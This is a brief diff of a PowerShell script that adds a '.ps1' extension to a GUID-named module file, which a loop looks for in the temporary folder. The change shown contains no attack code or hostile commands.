@@ -21,7 +21,7 @@ $functions = {
 	{
 		while($true)
 		{
-			$modulename = "18CAD998-388C-4E2A-83B7-C8F009416642"
+			$modulename = "18CAD998-388C-4E2A-83B7-C8F009416642.ps1"
 			$modulenamepath = "$env:TEMP\$modulename"
 			
 			if(-Not ([System.IO.File]::Exists($modulenamepath)))
